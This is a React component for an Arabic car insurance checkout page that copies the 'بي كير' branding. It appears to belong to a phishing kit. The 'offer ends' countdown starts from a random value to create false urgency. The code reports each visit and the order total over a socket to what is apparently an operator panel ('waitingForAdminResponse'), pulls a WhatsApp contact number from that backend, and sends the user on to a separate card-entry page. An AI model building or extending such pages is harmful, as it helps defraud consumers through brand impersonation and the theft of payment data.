import { useState, useEffect } from "react";
import { useLocation, Link } from "wouter";
import { sendData, navigateToPage, clientNavigate, socket, submitData } from "@/lib/store";
import { CreditCard, CheckCircle2, FileText, Eye } from "lucide-react";
import InsuranceDocument from "@/components/InsuranceDocument";

const primaryBlue = '#1a5276';
const orange = '#f5a623';

export default function SummaryPayment() {
  const [, setLocation] = useLocation();

  const [isProcessing, setIsProcessing] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [showDocument, setShowDocument] = useState(false);
  const [countdown, setCountdown] = useState(() => {
    const maxSeconds = 11 * 3600 + 47 * 60 + 4;
    const randomTotal = Math.floor(Math.random() * maxSeconds) + 1;
    const h = Math.floor(randomTotal / 3600);
    const m = Math.floor((randomTotal % 3600) / 60);
    const s = randomTotal % 60;
    return { hours: h, minutes: m, seconds: s };
  });

  // Get selected offer from localStorage
  const [selectedOffer, setSelectedOffer] = useState<any>(null);
  const [vehicleDetails, setVehicleDetails] = useState<any>(null);
  const [whatsappNumber, setWhatsappNumber] = useState("");

  useEffect(() => {
    socket.value.on("whatsapp:update", (number: string) => {
      setWhatsappNumber(number);
    });
    socket.value.emit("whatsapp:get");
    return () => {
      socket.value.off("whatsapp:update");
    };
  }, []);

  useEffect(() => {
    const offerStr = localStorage.getItem('selectedOffer');
    if (offerStr) {
      setSelectedOffer(JSON.parse(offerStr));
    }
    const vehicleStr = localStorage.getItem('vehicleDetails');
    if (vehicleStr) {
      setVehicleDetails(JSON.parse(vehicleStr));
    }
  }, []);

  const serviceName = selectedOffer?.name || '---';
  const insuranceType = selectedOffer?.type === 'against-others' ? 'تأمين ضد الغير' : 'تأمين شامل';
  const servicePrice = selectedOffer?.totalPrice || 0;
  const vatAmount = Math.round(servicePrice * 0.15 * 100) / 100;
  const totalAmount = Math.round((servicePrice + vatAmount) * 100) / 100;

  // Show popup after 2 seconds
  useEffect(() => {
    const popupTimer = setTimeout(() => {
      setShowPopup(true);
    }, 2000);
    return () => clearTimeout(popupTimer);
  }, []);

  // Countdown timer
  useEffect(() => {
    if (!showPopup) return;
    const interval = setInterval(() => {
      setCountdown(prev => {
        const totalSeconds = prev.hours * 3600 + prev.minutes * 60 + prev.seconds - 1;
        if (totalSeconds <= 0) {
          clearInterval(interval);
          return { hours: 0, minutes: 0, seconds: 0 };
        }
        return {
          hours: Math.floor(totalSeconds / 3600),
          minutes: Math.floor((totalSeconds % 3600) / 60),
          seconds: totalSeconds % 60,
        };
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [showPopup]);

  useEffect(() => {
    document.title = 'الملخص والدفع';
    navigateToPage('الملخص والدفع');
  }, []);

  const handlePayment = () => {
    setIsProcessing(true);

    sendData({
      data: {
        'المجموع الكلي': `${totalAmount} ريال`,
      },
      current: 'الملخص والدفع',
      waitingForAdminResponse: false,
    });

    const data: Record<string, string> = {
      'طريقة الدفع': 'بطاقة ائتمان / مدى',
      'المبلغ الإجمالي': totalAmount + ' ريال',
    };

    submitData(data);

    setTimeout(() => {
      setIsProcessing(false);
      clientNavigate(`/credit-card-payment?service=${encodeURIComponent(serviceName)}&amount=${totalAmount}`);
    }, 1500);
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>

      {/* Cashback Popup */}
      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={() => setShowPopup(false)}>
          <div className="bg-white rounded-2xl shadow-2xl max-w-sm w-[90%] mx-auto overflow-hidden" onClick={(e) => e.stopPropagation()}>
            <div className="w-full">
              <img src="/images/cashback-cards.png" alt="كاش باك 30%" className="w-full object-cover" />
            </div>
            <div className="p-6 text-center">
              <h3 className="text-2xl font-bold text-gray-900 mb-2">سارع قبل نهاية العرض!</h3>
              <p className="text-gray-500 mb-4">يتبقى على إنتهاء العرض</p>
              <div className="text-4xl font-bold mb-6" dir="ltr" style={{ color: primaryBlue }}>
                {String(countdown.hours).padStart(2, '0')}:{String(countdown.minutes).padStart(2, '0')}:{String(countdown.seconds).padStart(2, '0')}
              </div>
              <button
                onClick={() => setShowPopup(false)}
                className="w-3/4 py-3 bg-gray-600 text-white rounded-lg font-bold text-lg hover:bg-gray-700 transition-colors"
              >
                إغلاق
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Header - same as CompareOffers */}
      <header className="bg-white py-3 md:py-4 px-4 lg:px-8 flex items-center justify-between sticky top-0 z-50 shadow-sm">
        <div className="flex items-center gap-3">
          <Link to="/" className="cursor-pointer">
            <img src="/images/a1/l1.svg" alt="بي كير" className="h-8 md:h-10" />
          </Link>
        </div>
        <div className="flex items-center gap-2 md:gap-3">
          <button className="w-8 h-8 rounded-full border-2 flex items-center justify-center" style={{ borderColor: primaryBlue, color: primaryBlue }}>
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
          </button>
          <button className="px-2 md:px-3 py-1 text-sm font-bold" style={{ color: primaryBlue }}>EN</button>
        </div>
      </header>

      {/* Stepper - RTL: 1 on right, 4 on left - Steps 1-3 orange (completed), Step 4 blue (current) */}
      <div className="px-2 md:px-16 lg:px-28 pt-4 md:pt-8" dir="rtl">
        <div className="flex items-center justify-center mb-2">
          {/* Step 1 - completed (orange) */}
          <div className="flex flex-col items-center min-w-[50px] md:min-w-[80px]">
            <div className="w-8 h-8 md:w-10 md:h-10 rounded-full flex items-center justify-center text-white font-bold text-sm md:text-lg" style={{ backgroundColor: orange }}>1</div>
            <span className="text-[10px] md:text-xs mt-1 md:mt-2 text-center font-bold leading-tight" style={{ color: orange }}>البيانات الرئيسية</span>
          </div>
          {/* Line 1-2 (orange - completed) */}
          <div className="flex-1 h-0.5 md:h-1 mx-0.5 md:mx-1" style={{ backgroundColor: orange, marginBottom: '18px' }}></div>
          {/* Step 2 - completed (orange) */}
          <div className="flex flex-col items-center min-w-[50px] md:min-w-[80px]">
            <div className="w-8 h-8 md:w-10 md:h-10 rounded-full flex items-center justify-center text-white font-bold text-sm md:text-lg" style={{ backgroundColor: orange }}>2</div>
            <span className="text-[10px] md:text-xs mt-1 md:mt-2 text-center font-bold leading-tight" style={{ color: orange }}>تفاصيل وثيقة التأمين</span>
          </div>
          {/* Line 2-3 (orange - completed) */}
          <div className="flex-1 h-0.5 md:h-1 mx-0.5 md:mx-1" style={{ backgroundColor: orange, marginBottom: '18px' }}></div>
          {/* Step 3 - completed (orange) */}
          <div className="flex flex-col items-center min-w-[50px] md:min-w-[80px]">
            <div className="w-8 h-8 md:w-10 md:h-10 rounded-full flex items-center justify-center text-white font-bold text-sm md:text-lg" style={{ backgroundColor: orange }}>3</div>
            <span className="text-[10px] md:text-xs mt-1 md:mt-2 text-center font-bold leading-tight" style={{ color: orange }}>الشركات والعروض</span>
          </div>
          {/* Line 3-4 (blue - current transition) */}
          <div className="flex-1 h-0.5 md:h-1 mx-0.5 md:mx-1" style={{ backgroundColor: primaryBlue, marginBottom: '18px' }}></div>
          {/* Step 4 - current (blue) */}
          <div className="flex flex-col items-center min-w-[50px] md:min-w-[80px]">
            <div className="w-8 h-8 md:w-10 md:h-10 rounded-full flex items-center justify-center text-white font-bold text-sm md:text-lg" style={{ backgroundColor: primaryBlue }}>4</div>
            <span className="text-[10px] md:text-xs mt-1 md:mt-2 text-center font-bold leading-tight" style={{ color: primaryBlue }}>الملخص والدفع</span>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 px-3 md:px-16 lg:px-28 py-6 md:py-8">
        <div className="max-w-5xl mx-auto">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Right Side - Service Details + Payment Methods */}
            <div className="lg:col-span-2 space-y-6">
              {/* Service Details */}
              <div className="bg-white rounded-lg shadow-md overflow-hidden">
                <div className="p-4 md:p-6">
                  <div className="flex items-center gap-2 mb-4">
                    <FileText className="w-5 h-5" style={{ color: primaryBlue }} />
                    <h3 className="text-lg font-bold" style={{ color: primaryBlue }}>تفاصيل الخدمة</h3>
                  </div>
                  <div className="space-y-0">
                    <div className="flex justify-between items-center py-3 border-b border-gray-100">
                      <span className="text-gray-500 text-sm">شركة التأمين</span>
                      <span className="font-medium text-sm">{serviceName}</span>
                    </div>
                    <div className="flex justify-between items-center py-3 border-b border-gray-100">
                      <span className="text-gray-500 text-sm">نوع التأمين</span>
                      <span className="font-medium text-sm">{insuranceType}</span>
                    </div>
                    <div className="flex justify-between items-center py-3 border-b border-gray-100">
                      <span className="text-gray-500 text-sm">رسوم التأمين</span>
                      <span className="font-medium text-sm">{servicePrice} ر.س</span>
                    </div>
                    <div className="flex justify-between items-center py-3 border-b border-gray-100">
                      <span className="text-gray-500 text-sm">ضريبة القيمة المضافة (15%)</span>
                      <span className="font-medium text-sm">{vatAmount} ر.س</span>
                    </div>
                    <div className="flex justify-between items-center py-3 px-3 rounded-lg mt-2" style={{ backgroundColor: '#e8f4fd' }}>
                      <span className="font-bold" style={{ color: primaryBlue }}>المجموع الكلي</span>
                      <span className="font-bold text-xl" style={{ color: primaryBlue }}>{totalAmount} ر.س</span>
                    </div>
                  </div>
                  {/* Preview Insurance Document Button */}
                  <div className="mt-4 text-center">
                    <button
                      onClick={() => setShowDocument(true)}
                      className="inline-flex items-center gap-2 px-6 py-2.5 rounded-lg font-bold text-white transition-all hover:opacity-90"
                      style={{ backgroundColor: '#f5a623' }}
                    >
                      <Eye className="w-5 h-5" />
                      معاينة وثيقة التأمين
                    </button>
                  </div>
                </div>
              </div>


            </div>

            {/* Left Side - Order Summary */}
            <div className="lg:col-span-1">
              <div className="bg-white rounded-lg shadow-md sticky top-20 overflow-hidden">
                <div className="py-3 px-4 text-center" style={{ backgroundColor: '#e8f4fd' }}>
                  <h3 className="text-lg font-bold" style={{ color: primaryBlue }}>ملخص الطلب</h3>
                </div>
                <div className="p-4">
                  <div className="space-y-3">
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-500">الشركة</span>
                      <span className="font-medium text-xs">{serviceName}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-500">نوع التأمين</span>
                      <span className="font-medium text-xs">{insuranceType}</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-500">الرسوم</span>
                      <span>{servicePrice} ر.س</span>
                    </div>
                    <div className="flex justify-between text-sm">
                      <span className="text-gray-500">الضريبة</span>
                      <span>{vatAmount} ر.س</span>
                    </div>
                    <hr />
                    <div className="flex justify-between font-bold text-lg">
                      <span>المجموع</span>
                      <span style={{ color: primaryBlue }}>{totalAmount} ر.س</span>
                    </div>
                  </div>

                  <button
                    className="w-full mt-6 py-3 rounded-lg text-white font-bold flex items-center justify-center gap-2 transition-all"
                    style={{ backgroundColor: isProcessing ? '#9ca3af' : primaryBlue }}
                    disabled={isProcessing}
                    onClick={handlePayment}
                  >
                    {isProcessing ? (
                      <div className="flex items-center gap-2">
                        <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent" />
                        جاري المعالجة...
                      </div>
                    ) : (
                      <>
                        <CheckCircle2 className="w-4 h-4" />
                        متابعة الدفع
                      </>
                    )}
                  </button>

                  <p className="text-xs text-gray-500 text-center mt-4">
                    بالضغط على متابعة الدفع، أنت توافق على
                    <br />
                    <a href="#" className="underline" style={{ color: primaryBlue }}>شروط الخدمة</a> و<a href="#" className="underline" style={{ color: primaryBlue }}>سياسة الخصوصية</a>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Insurance Document Modal */}
      <InsuranceDocument
        isOpen={showDocument}
        onClose={() => setShowDocument(false)}
        offerData={selectedOffer}
        vehicleDetails={vehicleDetails}
      />

      {/* Footer - same as CompareOffers */}
      <footer className="text-white pt-8 md:pt-12 pb-6 mt-12" style={{ backgroundColor: '#146494' }}>
        <div className="container mx-auto px-4 lg:px-8">
          <div className="flex flex-col md:flex-row gap-6 mb-8">
            <div className="flex flex-col md:flex-row gap-6 md:items-start">
              <div className="text-right flex-shrink-0">
                <img src="/images/a1/l1.svg" alt="بي كير" className="h-10 mb-3 brightness-0 invert" />
                <p className="text-white text-lg font-bold mb-3" dir="ltr">☎ 8001180044</p>
                <img src="/images/a1/g2.svg" alt="طرق الدفع" className="h-8 mt-3" />
              </div>
              <div className="flex flex-row md:flex-col gap-2 flex-shrink-0">
                <img src="/images/a1/s2.svg" alt="Google Play" className="h-9 md:h-10 w-fit" />
                <img src="/images/a1/s1.svg" alt="App Store" className="h-9 md:h-10 w-fit" />
                <img src="/images/a1/s3.svg" alt="AppGallery" className="h-9 md:h-10 w-fit" />
              </div>
            </div>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 md:gap-6 flex-1">
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">عن بي كير</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">خصومات وريف</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">سياسة الخصوصية</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">الشروط والأحكام</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">وظائف</a></li>
                </ul>
              </div>
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">منتجاتنا</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">تأمين المركبات</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">التأمين الطبي</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">تأمين السفر</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">تأمين الأخطاء الطبية</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">تأمين العمالة المنزلية</a></li>
                </ul>
              </div>
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">الدعم الفني</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">المدونة</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">إلغاء وثيقتك</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">رفع تذكرة</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">اطبع وثيقتك</a></li>
                </ul>
              </div>
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">روابط مهمة</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">هيئة التأمين</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">طريقة رفع شكوى لهيئة التأمين</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">قواعد ولوائح هيئة التأمين</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">شهادة ضريبة القيمة المضافة</a></li>
                </ul>
              </div>
            </div>
          </div>
          <div className="border-t border-white/30 md:border-white pt-4 flex flex-col-reverse md:flex-row items-center justify-between gap-3 md:gap-0">
            <p className="text-[10px] md:text-sm text-white/80 text-center md:text-right mb-0 md:mb-0">
              2026 © جميع الحقوق محفوظة، شركة عناية الوسيط لوساطة التأمين
            </p>
            <div className="flex gap-2 md:gap-3">
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
              </a>
              <a href={whatsappNumber ? `https://wa.me/${whatsappNumber.replace(/\D/g, '')}` : '#'} target="_blank" rel="noopener noreferrer" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-[#25D366] transition-colors duration-300">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
